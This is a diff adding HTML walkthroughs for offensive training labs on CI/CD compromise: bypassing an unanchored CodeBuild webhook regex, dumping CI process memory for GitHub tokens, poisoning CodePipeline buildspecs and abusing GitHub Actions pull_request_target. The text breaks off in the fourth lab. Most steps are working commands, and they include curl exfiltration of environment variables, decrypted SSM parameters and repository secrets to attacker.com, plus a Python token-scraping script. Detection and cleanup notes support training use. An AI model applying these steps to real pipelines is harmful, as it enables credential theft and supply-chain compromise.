@@ -1,0 +1,838 @@
+<!-- M17: CI/CD Pipeline Compromise Labs -->
+
+<!-- ==================== L01 ==================== -->
+<div class="lab-walkthrough-content" id="M17-L01-content">
+  <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.</div>
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>AWS credentials with <code>codebuild:ListProjects</code>, <code>codebuild:BatchGetProjects</code> permissions</li>
+      <li>GitHub account and <code>gh</code> CLI installed and authenticated</li>
+      <li>Pre-provisioned lab GitHub account <code>lab-actor</code> (credentials provided in lab portal)</li>
+      <li>Python 3.x available on attacker machine</li>
+      <li>Attacker-controlled listener endpoint (ngrok or lab-provided URL)</li>
+    </ul>
+  </div>
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Exploit an unanchored regex in CodeBuild webhook filters to trigger unauthorized builds from an attacker-controlled GitHub account.</div>
+  <div class="lab-section">
+    <div class="lab-meta"><i class="fa-solid fa-shield-halved"></i> <strong>MITRE ATT&amp;CK:</strong> T1195.001 — Supply Chain Compromise: Compromise Software Dependencies and Development Tools &nbsp;|&nbsp; T1059.004 — Command and Scripting Interpreter: Unix Shell</div>
+  </div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Enumerate CodeBuild projects and inspect their webhook filter configurations for regex-based access controls.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws codebuild list-projects</div>
+            <div class="terminal-output">{
+    "projects": [
+        "target-project",
+        "internal-tools",
+        "staging-deploy"
+    ]
+}</div>
+            <div class="terminal-cmd">$ aws codebuild batch-get-projects --names target-project</div>
+            <div class="terminal-output">{
+    "projects": [{
+        "name": "target-project",
+        "webhook": {
+            "filterGroups": [[
+                {
+                    "type": "EVENT",
+                    "pattern": "PULL_REQUEST_CREATED, PULL_REQUEST_UPDATED"
+                },
+                {
+                    "type": "ACTOR_ACCOUNT_ID",
+                    "pattern": "123456789"
+                }
+            ]]
+        }
+    }]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Examine the regex flaw: the <code>ACTOR_ACCOUNT_ID</code> filter uses <code>123456789</code> without anchors. This allows any account whose ID <em>contains</em> the substring to pass.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># VULNERABLE — no anchors, matches substring</div>
+            <div class="terminal-output">"pattern": "123456789"
+→ Matches: 9912345678900, 00123456789, 1234567890000</div>
+            <div class="terminal-cmd"># SECURE — anchored, matches exact value only</div>
+            <div class="terminal-output">"pattern": "^123456789$"
+→ Matches ONLY: 123456789</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Understand the attacker's account ID strategy. In a real engagement, you would enumerate a target GitHub account's numeric ID and verify it contains the filter substring. For this lab, use the pre-provisioned account.</div>
+        <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Real-Engagement Context:</strong> In a real engagement, enumerate GitHub actor IDs via <code>curl https://api.github.com/users/&lt;username&gt;</code> and check if the numeric ID matches the filter pattern. You are looking for an account you control whose ID happens to contain the unanchored string as a substring. For this lab, use the pre-provisioned account <code>lab-actor</code> (ID: <code>123456789</code>) — do NOT attempt to register new GitHub accounts to farm for matching IDs.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Verify the pre-provisioned lab account ID matches the filter:</div>
+            <div class="terminal-cmd">$ curl -s https://api.github.com/users/lab-actor | jq '.id'</div>
+            <div class="terminal-output">123456789
+# ID matches the unanchored filter pattern — will pass the webhook check</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Fork the target repository using the <code>lab-actor</code> account and inject malicious commands into the <code>buildspec.yml</code> file. This code will execute inside CodeBuild when the webhook triggers.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat buildspec.yml</div>
+            <div class="terminal-output">version: 0.2
+phases:
+  build:
+    commands:
+      - echo "Running legitimate build..."
+      - curl -s https://attacker.com/cb?env=$(env | base64 | tr -d '\n')
+      - aws sts get-caller-identity  # Verify CodeBuild role access</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Submit a Pull Request from the forked repo. The webhook fires, the unanchored regex matches the attacker's account ID, and CodeBuild executes the malicious buildspec.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ gh pr create --title "Fix: update dependencies" --body "Routine dep bump"</div>
+            <div class="terminal-output">Creating pull request...
+https://github.com/org/target-project/pull/847
+
+[CodeBuild webhook triggered — build ID: target-project:abcd1234]</div>
+            <div class="terminal-cmd"># On attacker listener:</div>
+            <div class="terminal-output">GET /cb?env=QVBTX0FDQ0VTU19LRVk9QUtJQVhYWFhYWC4uLg==
+→ Decoded: AWS_ACCESS_KEY=AKIAXXXXXX... AWS_SECRET_ACCESS_KEY=...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Attacker account (ID contains substring)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">PR submitted</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Regex match (no anchors)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">CodeBuild runs attacker code</div>
+    </div>
+  </div>
+  <div class="lab-section">
+    <div class="lab-header"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li>CloudTrail: <code>StartBuild</code> events with <code>sourceVersion</code> referencing an external PR from an unexpected GitHub actor</li>
+      <li>CodeBuild build logs: unexpected outbound network calls (e.g., <code>curl</code> to external endpoints) during build phases</li>
+      <li>GuardDuty: <code>UnauthorizedAccess:IAMUser/TorIPCaller</code> or anomalous <code>GetCallerIdentity</code> calls from CodeBuild execution role</li>
+      <li>Review: periodically audit all <code>ACTOR_ACCOUNT_ID</code> webhook filter patterns for missing <code>^</code> and <code>$</code> anchors</li>
+    </ul>
+  </div>
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ol>
+      <li>Close the test pull request: <code>gh pr close &lt;PR-NUMBER&gt;</code></li>
+      <li>Delete the forked repository from the <code>lab-actor</code> GitHub account</li>
+      <li>Remove any injected commands from <code>buildspec.yml</code> and restore the original file</li>
+      <li>Confirm no persistent credentials were exfiltrated to external endpoints by reviewing build logs</li>
+    </ol>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> CodeBreach (Jan 2026) exploited this exact flaw — two missing characters (<code>^</code> and <code>$</code>) nearly backdoored the AWS JavaScript SDK. Always anchor your regex patterns.</div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ==================== L02 ==================== -->
+<div class="lab-walkthrough-content" id="M17-L02-content">
+  <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.</div>
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Code execution inside an active CodeBuild build environment (obtained via L01 or equivalent)</li>
+      <li>The build environment must be using a GitHub token for repo cloning (check for <code>git-credential-cache</code> or <code>git-remote-https</code> processes)</li>
+      <li>Python 3.x available in the build environment (standard in Amazon Linux 2 / Ubuntu CodeBuild images)</li>
+      <li><code>gdb</code> may not be pre-installed — install step included below</li>
+    </ul>
+  </div>
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Extract GitHub Personal Access Tokens from CI build process memory during a CodeBuild execution.</div>
+  <div class="lab-section">
+    <div class="lab-meta"><i class="fa-solid fa-shield-halved"></i> <strong>MITRE ATT&amp;CK:</strong> T1552.004 — Unsecured Credentials: Private Keys &nbsp;|&nbsp; T1059.004 — Command and Scripting Interpreter: Unix Shell</div>
+  </div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Enumerate the build environment — list all environment variables and running processes to understand what's available in the CI container.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ env | sort</div>
+            <div class="terminal-output">AWS_DEFAULT_REGION=us-east-1
+AWS_REGION=us-east-1
+CODEBUILD_BUILD_ARN=arn:aws:codebuild:us-east-1:123456789012:build/target:abc123
+CODEBUILD_BUILD_ID=target:abc123
+CODEBUILD_SRC_DIR=/codebuild/output/src123
+HOME=/root
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+...</div>
+            <div class="terminal-cmd">$ ps aux</div>
+            <div class="terminal-output">USER       PID  COMMAND
+root         1  /bin/sh -c /codebuild/output/tmp/script.sh
+root        42  git clone https://github.com/org/target.git
+root        58  git-remote-https origin https://github.com/org/target.git
+root        71  /usr/bin/git credential-cache daemon</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Identify processes that handle credentials — any git, credential helper, or authentication process will have tokens in memory.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ ps aux | grep -i 'git\|credential'</div>
+            <div class="terminal-output">root   42  git clone https://github.com/org/target.git
+root   58  git-remote-https origin https://github.com/org/target.git
+root   71  /usr/bin/git credential-cache daemon --timeout=3600</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Dump process memory of the git credential daemon. CodeBuild images do not include <code>gdb</code> by default — install it first, or use the pure-Python <code>/proc/&lt;pid&gt;/mem</code> fallback method.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat /proc/$(pgrep -f git-credential)/maps</div>
+            <div class="terminal-output">55a3c0200000-55a3c0210000 r--p 00000000 fd:01 1234  /usr/bin/git
+55a3c0400000-55a3c0500000 rw-p 00000000 00:00 0      [heap]
+7f8a10000000-7f8a10021000 rw-p 00000000 00:00 0
+...</div>
+            <div class="terminal-cmd"># Method A: gdb (install if missing)</div>
+            <div class="terminal-cmd">$ apt-get install -y gdb 2>/dev/null || yum install -y gdb</div>
+            <div class="terminal-cmd">$ gdb -batch \
+  -ex "dump memory /tmp/mem.bin 0x55a3c0400000 0x55a3c0500000" \
+  -p $(pgrep -f git-credential)</div>
+            <div class="terminal-output">Attaching to process 71...
+Dumping memory region [heap] to /tmp/mem.bin...
+Detaching from process 71</div>
+          </div>
+        </div>
+        <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Fallback — Python /proc/mem reader:</strong> If <code>gdb</code> cannot be installed (e.g., restricted package manager, read-only filesystem), use this pure-Python alternative that reads directly from <code>/proc/&lt;pid&gt;/mem</code>. Save as <code>/tmp/memdump.py</code> and run with the target PID.
+        <pre><code>import re, sys
+pid = int(sys.argv[1])
+maps = open(f'/proc/{pid}/maps').read()
+mem = open(f'/proc/{pid}/mem', 'rb')
+for line in maps.split('\n'):
+    m = re.match(r'([0-9a-f]+)-([0-9a-f]+)', line)
+    if m:
+        start, end = int(m.group(1), 16), int(m.group(2), 16)
+        if end - start > 10*1024*1024: continue  # skip huge regions
+        try:
+            mem.seek(start)
+            chunk = mem.read(end - start)
+            for tok in re.findall(b'ghp_[a-zA-Z0-9]{36}', chunk):
+                print(tok.decode())
+        except:
+            pass</code></pre>
+        <code>$ python3 /tmp/memdump.py $(pgrep -f git-credential)</code></div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Search the memory dump for GitHub token patterns — classic PATs start with <code>ghp_</code>, fine-grained tokens with <code>github_pat_</code>.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ strings /tmp/mem.bin | grep -E 'ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{82}'</div>
+            <div class="terminal-output">ghp_a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Validate the extracted PAT against the GitHub API — check scope and permissions. A CI bot token often has admin-level repo access.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ curl -sH "Authorization: token ghp_a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8" \
+  https://api.github.com/user</div>
+            <div class="terminal-output">{
+    "login": "ci-bot-prod",
+    "id": 98765432,
+    "type": "User",
+    "site_admin": false
+}</div>
+            <div class="terminal-cmd">$ curl -sH "Authorization: token ghp_a1B2c3D..." \
+  https://api.github.com/user/repos?type=all | jq '.[].full_name'</div>
+            <div class="terminal-output">"org/production-api"
+"org/internal-sdk"
+"org/infrastructure"
+"org/customer-data-pipeline"</div>
+            <div class="terminal-cmd"># Token has admin access to 47 org repositories</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">CI Build</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Enumerate processes</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Dump memory</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Extract PAT</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">GitHub admin access</div>
+    </div>
+  </div>
+  <div class="lab-section">
+    <div class="lab-header"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li>CodeBuild build logs: unexpected <code>apt-get install gdb</code>, <code>yum install gdb</code>, or Python scripts reading <code>/proc/*/mem</code></li>
+      <li>CloudTrail: GitHub API calls (via <code>curl</code>) from within CodeBuild execution environments to <code>api.github.com</code></li>
+      <li>GitHub audit log: token usage from IP ranges belonging to AWS CodeBuild in unexpected regions</li>
+      <li>Preventive: use GitHub OIDC-based auth for CodeBuild instead of long-lived PATs stored in Secrets Manager</li>
+    </ul>
+  </div>
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ol>
+      <li>Remove any temporary files written during the lab: <code>rm -f /tmp/mem.bin /tmp/memdump.py</code></li>
+      <li>Revoke the lab PAT from the GitHub account settings if it was a real token used in testing</li>
+      <li>Rotate any CI tokens that were extracted during the exercise</li>
+    </ol>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> CI runners are treasure troves of secrets. Even when environment variables are masked, tokens persist in process memory, <code>/proc</code> filesystem, and credential helper caches.</div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ==================== L03 ==================== -->
+<div class="lab-walkthrough-content" id="M17-L03-content">
+  <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.</div>
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>AWS credentials with <code>codepipeline:ListPipelines</code>, <code>codepipeline:GetPipeline</code>, <code>codepipeline:UpdatePipeline</code>, <code>codepipeline:StartPipelineExecution</code></li>
+      <li><code>codebuild:BatchGetProjects</code> permission to inspect build project configuration</li>
+      <li>Either write access to the source repository (buildspec injection path) OR <code>codepipeline:UpdatePipeline</code> (direct pipeline modification path)</li>
+      <li>Attacker-controlled listener endpoint for exfiltration</li>
+    </ul>
+  </div>
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Poison a CodePipeline deployment by modifying the buildspec to exfiltrate secrets and inject malicious code into production.</div>
+  <div class="lab-section">
+    <div class="lab-meta"><i class="fa-solid fa-shield-halved"></i> <strong>MITRE ATT&amp;CK:</strong> T1195.001 — Supply Chain Compromise: Compromise Software Dependencies and Development Tools &nbsp;|&nbsp; T1554 — Compromise Client Software Binary</div>
+  </div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Enumerate all CodePipeline pipelines and inspect the production deployment pipeline configuration for build artifact sources and stages.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws codepipeline list-pipelines</div>
+            <div class="terminal-output">{
+    "pipelines": [
+        {"name": "production-deploy", "version": 3},
+        {"name": "staging-deploy", "version": 5},
+        {"name": "internal-tools", "version": 1}
+    ]
+}</div>
+            <div class="terminal-cmd">$ aws codepipeline get-pipeline --name production-deploy</div>
+            <div class="terminal-output">{
+    "pipeline": {
+        "name": "production-deploy",
+        "stages": [
+            {"name": "Source", "actions": [{"configuration": {
+                "RepositoryName": "production-api",
+                "BranchName": "main"
+            }}]},
+            {"name": "Build", "actions": [{"configuration": {
+                "ProjectName": "prod-build",
+                "EnvironmentVariables": "[{\"name\":\"DEPLOY_KEY\",\"value\":\"/secrets/deploy\",\"type\":\"PARAMETER_STORE\"}]"
+            }}]},
+            {"name": "Deploy", "actions": [{"configuration": {
+                "ClusterName": "prod-cluster",
+                "ServiceName": "api-service"
+            }}]}
+        ]
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Locate the buildspec file referenced by the pipeline's Build stage. This is the file that CodeBuild executes — our injection point.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws codebuild batch-get-projects --names prod-build \
+  --query 'projects[0].source.buildspec'</div>
+            <div class="terminal-output">"buildspec.yml"</div>
+            <div class="terminal-cmd"># Buildspec is sourced from the repo root — modifiable via git push</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Modify the <code>buildspec.yml</code> to inject exfiltration commands in the <code>post_build</code> phase. This runs after a successful build, right before deployment artifacts are created.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat buildspec.yml</div>
+            <div class="terminal-output">version: 0.2
+phases:
+  install:
+    commands:
+      - npm ci
+  build:
+    commands:
+      - npm run build
+      - npm test
+  post_build:
+    commands:
+      - echo "Generating deployment artifacts..."
+      - curl -s https://attacker.com/exfil?data=$(env | base64 | tr -d '\n')
+      - aws ssm get-parameters-by-path --path /prod --recursive --with-decryption \
+          | curl -s -X POST -d @- https://attacker.com/params</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Alternative: directly modify the pipeline definition to inject malicious stages. Note that <code>get-pipeline</code> returns metadata that must be stripped before <code>update-pipeline</code> will accept the payload — use <code>--query pipeline</code> to extract only the pipeline object.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># WRONG — will fail with InvalidStructureException because the
+# response includes top-level metadata fields (metadata, tags) that
+# update-pipeline does not accept:
+# aws codepipeline get-pipeline --name production-deploy > pipeline.json
+# aws codepipeline update-pipeline --pipeline file://pipeline.json
+
+# CORRECT — use --query to extract only the pipeline object:</div>
+            <div class="terminal-cmd">$ aws codepipeline get-pipeline --name production-deploy \
+  --query 'pipeline' --output json > pipeline.json
+# Edit pipeline.json to inject malicious buildspec override or new stage
+$ aws codepipeline update-pipeline --pipeline file://pipeline.json</div>
+            <div class="terminal-output">{
+    "pipeline": {
+        "name": "production-deploy",
+        "version": 4
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Wait for the next pipeline execution (or trigger one manually). The poisoned build runs, exfiltrating all environment secrets and SSM parameters to the attacker's endpoint.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws codepipeline start-pipeline-execution --name production-deploy</div>
+            <div class="terminal-output">{"pipelineExecutionId": "exec-a1b2c3d4-e5f6-7890-abcd-ef1234567890"}</div>
+            <div class="terminal-cmd"># Attacker listener receives:</div>
+            <div class="terminal-output">POST /params
+{
+  "Parameters": [
+    {"Name": "/prod/db/password", "Value": "Pr0d-DB-S3cret!"},
+    {"Name": "/prod/api/stripe-key", "Value": "sk_live_..."},
+    {"Name": "/prod/deploy/signing-key", "Value": "-----BEGIN RSA PRIVATE KEY-----..."}
+  ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Modify buildspec</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Pipeline triggers</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Build runs attacker commands</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Secrets exfiltrated</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Prod compromised</div>
+    </div>
+  </div>
+  <div class="lab-section">
+    <div class="lab-header"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li>CloudTrail: <code>UpdatePipeline</code> events — alert on any pipeline modification outside of an approved change management window</li>
+      <li>CodeBuild build logs: unexpected <code>curl</code> calls to external IPs, <code>aws ssm get-parameters-by-path</code> invocations outside of approved scripts</li>
+      <li>CloudTrail: <code>GetParametersByPath</code> calls with <code>WithDecryption=true</code> originating from CodeBuild execution roles</li>
+      <li>Preventive: use ABAC or resource-based conditions on <code>ssm:GetParameter</code> to scope access to specific parameter paths per pipeline</li>
+    </ul>
+  </div>
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ol>
+      <li>Restore the original <code>buildspec.yml</code> by reverting the git commit</li>
+      <li>If the pipeline definition was modified directly, restore from backup: <code>aws codepipeline update-pipeline --pipeline file://original-pipeline.json</code></li>
+      <li>Rotate any SSM Parameter Store values that were read with decryption during the lab</li>
+      <li>Remove <code>pipeline.json</code> from disk: <code>rm -f pipeline.json</code></li>
+    </ol>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> CodePipeline poisoning is devastating because the build environment has access to deployment secrets, production credentials, and artifact signing keys — all in a single execution context.</div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ==================== L04 ==================== -->
+<div class="lab-walkthrough-content" id="M17-L04-content">
+  <div class="warning"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.</div>
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li><code>gh</code> CLI installed and authenticated with an attacker-controlled GitHub account</li>
+      <li>Read access to the target repository's <code>.github/workflows/</code> directory</li>
+      <li>Ability to fork the target repository</li>
+      <li>Attacker-controlled listener for receiving exfiltrated secrets</li>
+    </ul>
+  </div>
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Achieve remote code execution on the base repository's runner by abusing the <code>pull_request_target</code> event to access secrets from a forked PR.</div>
+  <div class="lab-section">
+    <div class="lab-meta"><i class="fa-solid fa-shield-halved"></i> <strong>MITRE ATT&amp;CK:</strong> T1195.001 — Supply Chain Compromise &nbsp;|&nbsp; T1059.004 — Command and Scripting Interpreter: Unix Shell &nbsp;|&nbsp; T1552.004 — Unsecured Credentials: Private Keys</div>
+  </div>
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Search the target repository for workflows using the <code>pull_request_target</code> event trigger — these run in the context of the base repo, not the fork.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ find .github/workflows/ -name "*.yml" -exec grep -l "pull_request_target" {} \;</div>
+            <div class="terminal-output">.github/workflows/auto-label.yml
+.github/workflows/pr-validation.yml</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Identify the vulnerable pattern: a <code>pull_request_target</code> workflow that checks out the PR head code (the attacker's fork) instead of the base branch. This gives attacker-controlled code access to base repo secrets.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat .github/workflows/pr-validation.yml</div>
+            <div class="terminal-output">name: PR Validation
+on:
+  pull_request_target:          # Runs with BASE repo permissions
+    types: [opened, synchronize]
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}  # VULNERABLE: checks out FORK code
+      - run: ./scripts/validate.sh  # Runs attacker-controlled script with base secrets</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Fork the repository and modify the script that gets executed by the workflow. Inject commands to exfiltrate all repository secrets.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat scripts/validate.sh</div>
+            <div class="terminal-output">#!/bin/bash
+# "Validation" script — actually exfiltrates secrets
+echo "Running validation checks..."
+curl -s -X POST https://attacker.com/ghsecrets \
+  -d "token=${GITHUB_TOKEN}" \
+  -d "aws_key=${AWS_ACCESS_KEY_ID}" \
+  -d "aws_secret=${AWS_SECRET_ACCESS_KEY}" \
+  -d "npm_token=${NPM_TOKEN}"
+echo "Validation passed!"</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Submit a PR from the fork to the base repository. The <code>pull_request_target</code> workflow fires immediately — running the attacker's modified script in the base repo's context with full access to all secrets.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ gh pr create --title "docs: fix typo in README" \
+  --body "Minor documentation fix" --repo org/target-repo</div>
+            <div class="terminal-output">Creating pull request...
+https://github.com/org/target-repo/pull/312
+
+[Actions: PR Validation workflow triggered — running in BASE context]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Alternatively, exploit expression injection if the workflow uses attacker-controllable inputs in <code>run:</code> commands. Note the important distinction: <code>${{ secrets.GITHUB_TOKEN }}</code> is resolved at YAML parse time and will not be interpolated into a shell command, but <code>$GITHUB_TOKEN</code> — the environment variable the runner injects — is accessible in the shell at runtime.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># If workflow has: run: echo "PR title: ${{ github.event.pull_request.title }}"
+# The title is interpolated into the shell command at YAML evaluation time.
+# Set PR title to inject shell commands targeting the runner-injected env var:</div>
